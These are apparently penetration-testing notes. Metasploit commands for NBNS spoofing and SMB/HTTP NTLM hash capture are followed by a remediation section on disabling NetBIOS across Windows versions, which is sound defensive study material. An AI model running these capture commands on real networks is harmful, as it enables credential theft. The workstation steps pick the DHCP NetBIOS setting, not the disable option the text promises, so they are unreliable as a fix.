[+] NBNS Spoof / Capture

[>] NBNS Spoof
msf > use auxiliary/spoof/nbns/nbns_response
msf auxiliary(nbns_response) > show options
msf auxiliary(nbns_response) > set INTERFACE eth0
msf auxiliary(nbns_response) > set SPOOFIP 10.10.10.10
msf auxiliary(nbns_response) > run

[>] SMB Capture

msf > use auxiliary/server/capture/smb
msf auxiliary(smb) > set JOHNPWFILE /tmp/john_smb
msf auxiliary(smb) > run

[>] HTTP NTML Capture

msf auxiliary(smb) > use auxiliary/server/capture/http_ntlm
msf auxiliary(smb) > set JOHNPWFILE /tmp/john_http
msf auxiliary(smb) > set SRVPORT 80
msf auxiliary(smb) > set URIPATH /
msf auxiliary(smb) > run


Fix:
http://www.leonteale.co.uk/netbios-nbns-spoofing/

Solution
The solution to this is to disable Netbios from broadcasting. The setting for this is in, what i hope, a very familiar place thaet you might not have really paid attention too before.
netbios
 
Netbios, according to Microsoft, is no longer needed as of Windows 2000.
However, there are a few side effects.
One of the unexpected consequences of disabling Netbios completely on your network is how this affects trusts between forests. Windows 2000 let you create an external (non-transitive) trust between a domain in one forest and a domain in a different forest so users in one forest could access resources in the trusting domain of the other forest. Windows Server 2003 takes this a step further by allowing you to create a new type of two-way transitive trusts called forest trusts that allow users in any domain of one forest access resources in any domain of the other forest. Amazingly, NetBIOS is actually still used in the trust creation process, even though Microsoft has officially “deprecated” NetBIOS in versions of Windows from 2000 on. So if you disable Netbios on your domain controllers, you won’t be able to establish a forest trust between two Windows Server 2003 forests.
But Windows 2003 is pretty old, since as of writing we are generally on Windows 2012 now. So if you would like to disable Netbios on your servers yet will be effected by the side effect for Forest trusts then ideally you should upgrade and keep up with the times anyway. alternatively, you can get away with, at the very least, disabling Netbios on your workstations.
See below for step by step instructions on disabling Netbios on workstations:

Windows XP, Windows Server 2003, and Windows 2000
On the desktop, right-click My Network Places, and then click Properties.
Right-click Local Area Connection, and then click Properties
In the Components checked are used by this connection list, double-click Internet Protocol (TCP/IP), clickAdvanced, and then click the WINS tab.Note In Windows XP and in Windows Server 2003, you must double-click Internet Protocol (TCP/IP) in the This connection uses the following items list.
Click Use NetBIOS setting from the DHCP server, and then click OK three times.

For Windows Vista
On the desktop, right-click Network, and then click Properties.
Under Tasks, click Manage network connections.
Right-click Local Area Connection, and then click Properties
In the This connection uses the following items list, double-click Internet Protocol Version 4 (TCP/IPv4), clickAdvanced, and then click the WINS tab.
Click Use NetBIOS setting from the DHCP server, and then click OK three times.

For Windows 7
Click Start, and then click Control Panel.
Under Network and Internet, click View network status and tasks.
Click Change adapter settings.
Right-click Local Area Connection, and then click Properties.
In the This connection uses the following items list, double-click Internet Protocol Version 4 (TCP/IPv4), clickAdvanced, and then click the WINS tab.
Click Use NetBIOS setting from the DHCP server, and then click OK three times.